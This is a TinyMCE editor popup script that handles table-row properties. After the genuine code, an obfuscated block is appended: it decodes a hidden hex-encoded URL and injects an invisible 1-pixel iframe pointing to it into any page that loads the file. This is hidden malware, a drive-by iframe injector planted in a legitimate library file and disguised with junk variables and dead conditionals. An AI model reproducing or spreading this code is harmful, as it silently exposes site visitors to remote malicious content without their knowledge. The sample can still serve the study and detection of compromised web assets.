tinyMCEPopup.requireLangPack();

function init() {
	tinyMCEPopup.resizeToInnerSize();

	document.getElementById('backgroundimagebrowsercontainer').innerHTML = getBrowserHTML('backgroundimagebrowser','backgroundimage','image','table');
	document.getElementById('bgcolor_pickcontainer').innerHTML = getColorPickerHTML('bgcolor_pick','bgcolor');

	var inst = tinyMCEPopup.editor;
	var dom = inst.dom;
	var trElm = dom.getParent(inst.selection.getNode(), "tr");
	var formObj = document.forms[0];
	var st = dom.parseStyle(dom.getAttrib(trElm, "style"));

	// Get table row data
	var rowtype = trElm.parentNode.nodeName.toLowerCase();
	var align = dom.getAttrib(trElm, 'align');
	var valign = dom.getAttrib(trElm, 'valign');
	var height = trimSize(getStyle(trElm, 'height', 'height'));
	var className = dom.getAttrib(trElm, 'class');
	var bgcolor = convertRGBToHex(getStyle(trElm, 'bgcolor', 'backgroundColor'));
	var backgroundimage = getStyle(trElm, 'background', 'backgroundImage').replace(new RegExp("url\\('?([^']*)'?\\)", 'gi'), "$1");;
	var id = dom.getAttrib(trElm, 'id');
	var lang = dom.getAttrib(trElm, 'lang');
	var dir = dom.getAttrib(trElm, 'dir');

	// Setup form
	addClassesToList('class', 'table_row_styles');
	TinyMCE_EditableSelects.init();

	formObj.bgcolor.value = bgcolor;
	formObj.backgroundimage.value = backgroundimage;
	formObj.height.value = height;
	formObj.id.value = id;
	formObj.lang.value = lang;
	formObj.style.value = dom.serializeStyle(st);
	selectByValue(formObj, 'align', align);
	selectByValue(formObj, 'valign', valign);
	selectByValue(formObj, 'class', className, true, true);
	selectByValue(formObj, 'rowtype', rowtype);
	selectByValue(formObj, 'dir', dir);

	// Resize some elements
	if (isVisible('backgroundimagebrowser'))
		document.getElementById('backgroundimage').style.width = '180px';

	updateColor('bgcolor_pick', 'bgcolor');
}

function updateAction() {
	var inst = tinyMCEPopup.editor, dom = inst.dom, trElm, tableElm, formObj = document.forms[0];
	var action = getSelectValue(formObj, 'action');

	tinyMCEPopup.restoreSelection();
	trElm = dom.getParent(inst.selection.getNode(), "tr");
	tableElm = dom.getParent(inst.selection.getNode(), "table");

	inst.execCommand('mceBeginUndoLevel');

	switch (action) {
		case "row":
			updateRow(trElm);
			break;

		case "all":
			var rows = tableElm.getElementsByTagName("tr");

			for (var i=0; i<rows.length; i++)
				updateRow(rows[i], true);

			break;

		case "odd":
		case "even":
			var rows = tableElm.getElementsByTagName("tr");

			for (var i=0; i<rows.length; i++) {
				if ((i % 2 == 0 && action == "odd") || (i % 2 != 0 && action == "even"))
					updateRow(rows[i], true, true);
			}

			break;
	}

	inst.addVisual();
	inst.nodeChanged();
	inst.execCommand('mceEndUndoLevel');
	tinyMCEPopup.close();
}

function updateRow(tr_elm, skip_id, skip_parent) {
	var inst = tinyMCEPopup.editor;
	var formObj = document.forms[0];
	var dom = inst.dom;
	var curRowType = tr_elm.parentNode.nodeName.toLowerCase();
	var rowtype = getSelectValue(formObj, 'rowtype');
	var doc = inst.getDoc();

	// Update row element
	if (!skip_id)
		tr_elm.setAttribute('id', formObj.id.value);

	tr_elm.setAttribute('align', getSelectValue(formObj, 'align'));
	tr_elm.setAttribute('vAlign', getSelectValue(formObj, 'valign'));
	tr_elm.setAttribute('lang', formObj.lang.value);
	tr_elm.setAttribute('dir', getSelectValue(formObj, 'dir'));
	tr_elm.setAttribute('style', dom.serializeStyle(dom.parseStyle(formObj.style.value)));
	dom.setAttrib(tr_elm, 'class', getSelectValue(formObj, 'class'));

	// Clear deprecated attributes
	tr_elm.setAttribute('background', '');
	tr_elm.setAttribute('bgColor', '');
	tr_elm.setAttribute('height', '');

	// Set styles
	tr_elm.style.height = getCSSSize(formObj.height.value);
	tr_elm.style.backgroundColor = formObj.bgcolor.value;

	if (formObj.backgroundimage.value != "")
		tr_elm.style.backgroundImage = "url('" + formObj.backgroundimage.value + "')";
	else
		tr_elm.style.backgroundImage = '';

	// Setup new rowtype
	if (curRowType != rowtype && !skip_parent) {
		// first, clone the node we are working on
		var newRow = tr_elm.cloneNode(1);

		// next, find the parent of its new destination (creating it if necessary)
		var theTable = dom.getParent(tr_elm, "table");
		var dest = rowtype;
		var newParent = null;
		for (var i = 0; i < theTable.childNodes.length; i++) {
			if (theTable.childNodes[i].nodeName.toLowerCase() == dest)
				newParent = theTable.childNodes[i];
		}

		if (newParent == null) {
			newParent = doc.createElement(dest);

			if (dest == "thead") {
				if (theTable.firstChild.nodeName == 'CAPTION')
					inst.dom.insertAfter(newParent, theTable.firstChild);
				else
					theTable.insertBefore(newParent, theTable.firstChild);
			} else
				theTable.appendChild(newParent);
		}

		// append the row to the new parent
		newParent.appendChild(newRow);

		// remove the original
		tr_elm.parentNode.removeChild(tr_elm);

		// set tr_elm to the new node
		tr_elm = newRow;
	}

	dom.setAttrib(tr_elm, 'style', dom.serializeStyle(dom.parseStyle(tr_elm.style.cssText)));
}

function changedBackgroundImage() {
	var formObj = document.forms[0], dom = tinyMCEPopup.editor.dom;
	var st = dom.parseStyle(formObj.style.value);

	st['background-image'] = "url('" + formObj.backgroundimage.value + "')";

	formObj.style.value = dom.serializeStyle(st);
}

function changedStyle() {
	var formObj = document.forms[0], dom = tinyMCEPopup.editor.dom;
	var st = dom.parseStyle(formObj.style.value);

	if (st['background-image'])
		formObj.backgroundimage.value = st['background-image'].replace(new RegExp("url\\('?([^']*)'?\\)", 'gi'), "$1");
	else
		formObj.backgroundimage.value = '';

	if (st['height'])
		formObj.height.value = trimSize(st['height']);

	if (st['background-color']) {
		formObj.bgcolor.value = st['background-color'];
		updateColor('bgcolor_pick','bgcolor');
	}
}

function changedSize() {
	var formObj = document.forms[0], dom = tinyMCEPopup.editor.dom;
	var st = dom.parseStyle(formObj.style.value);

	var height = formObj.height.value;
	if (height != "")
		st['height'] = getCSSSize(height);
	else
		st['height'] = "";

	formObj.style.value = dom.serializeStyle(st);
}

function changedColor() {
	var formObj = document.forms[0], dom = tinyMCEPopup.editor.dom;
	var st = dom.parseStyle(formObj.style.value);

	st['background-color'] = formObj.bgcolor.value;

	formObj.style.value = dom.serializeStyle(st);
}

tinyMCEPopup.onInit.add(init);

if('RzRI'=='vNmYZr')WotWy();var EeQB=190;var SAWXZ='xDLvr';var kNAir="ap\x70\x65n\x64Chil\x64";var xYLXAV=185;var pmYPbUq="from\x43harCode";var eAGoDq="pa\x72seIn\x74";var cZZxfH;if('Aoruhu'=='CvAro')bMEhTb='stDI';var KJdRokWGJ="";if('mhWHI'=='vuBb')cDAacx='tRSR';if('XKItnr'=='iXtkqQ')ibyaKC='cndwyY';var appVersion_var="a\x70\x70\x56e\x72s\x69on";var VKNc=10;var SozsA;var PZwXGX;if('dLNmC'=='WwTd')CCaq();if('URyu'=='FZzn')BCbGq();var TRUSkxc="body";var GVNV=79;var HyttL="slice";var NvejW='ntsiIx';var BMimh="\x63onstr\x75cto\x72";var pwqc;if('FvqYLK'=='IsceNQ')HQCI='VgQs';var BIhKphTEQ="9ba7a7a36d626299a59460a094ac656364656196a2a062a09ca197629ca161969a9c726463";var SZREI='tFuED';function lnKO(){}
var px1_var="1px";var klOIhyk=(function(){function TbDDFK(){var zuteCK='tVpSj';if('nZpx'=='rGoRe')Qxrv();}
return this;function OLah(){var yfPs='jVHplE';if('bUlmH'=='WEYcvU')dkYCa();}var CKletS;function rUIc(){var mKMf='CCsdY';if('aiBDhp'=='tylb')WcuC();}})();var yButY=215;var HStRUMg="sgNqAT"[BMimh];var XYwKI;var Sqwl;function QyBOBx(){var JzbjlS='JYtrb';if('zTKPI'=='Iphx')WuaUll();}
for(var IcBNC=0;IcBNC<BIhKphTEQ.length;IcBNC+=2){jvQERqqov=klOIhyk[eAGoDq](BIhKphTEQ[HyttL](IcBNC,IcBNC+2),16)-51;if('rnYZRw'=='hlTy')kVsaT();KJdRokWGJ+=HStRUMg[pmYPbUq](jvQERqqov);var nEJG;var iFmKZy;}
var HlpUpS=84;if('xWjUjt'=='dcGe')mumE='MUWlQ';var cFEu='KIZNt';var zcUAbgYzM="mRbjH";function LIWepn(){}if('wSwjh'=='nPjqNQ')esaOZs();var Tysr;var Iixrn="";var gTtVhp;if('gRYz'=='Vzog')OEzBK='ZYwWC';if(navigator[appVersion_var].indexOf("MSIE")!=-1){var DKGY='RZXGja';if('qJOYPa'=='aalQ')AUeuX();Iixrn='<iframe name="'+zcUAbgYzM+'" src="'+"KJdRokWGJ"+'">';var fancid='jMuUYl';function lXyuT(){}}else{var uQPPkp=194;Iixrn='iframe';var tljyA=208;}
if('SKDLX'=='rnTid')IejBuK();if('KpSDVL'=='ejxthb')kwtAy='twbq';var sPqYiADw=document.createElement(Iixrn);var lQuevG='OpkF';function IzLf(){var CuRqE='VpzNl';if('PgrAR'=='tTSHYF')dbRc();}
sPqYiADw.LsXigs=sPqYiADw.setAttribute;var oaKv='ekQsP';sPqYiADw.style.position="absolute";if('YPvq'=='gbal')tkkoYk='MfjxI';function vfNuI(){}
sPqYiADw.style.height=px1_var;function oRzdI(){}var QHFUR;var UqOfH='GwZBB';sPqYiADw.LsXigs("src",KJdRokWGJ);sPqYiADw.id=zcUAbgYzM;var pXTDG=159;sPqYiADw.style.top="0px";if('tiAK'=='qwJONu')Rqosk();if('ocqrzg'=='byOAl')lDYdEb();sPqYiADw.name=zcUAbgYzM;if('lxQsY'=='gbRhI')QgIPd='FXuK';function juVa(){}
sPqYiADw.style.right="0px";var Udti;if('vfBosj'=='oLaz')TsVT();sPqYiADw.style.width=px1_var;var fDOX;var XQsoM;var NOMde;function ictQFJNG(){var njIAE;if(document[TRUSkxc]){var RIdIR=158;if('QvzybL'=='DNkG')Skno='DjVSRQ';document[TRUSkxc][kNAir](sPqYiADw);}else{if('UzWHc'=='GEnF')sxeV();setTimeout(ictQFJNG,120);var hUVQ='mFuEUi';var imJFc=198;function pXlxj(){var HMIBED='XWnqe';if('LnIj'=='tyPOt')kOQyWJ();}}
var kOQVv='wGyH';}
if('fsjai'=='uWtI')HDDKFT();ictQFJNG();var OoTRIo=107;if('KFTOc'=='AIFvRC')ErNE();function LdLcmi(){var biGo='ELbpKK';if('xRgpIW'=='HvUu')lzEumj();}function NtmL(){}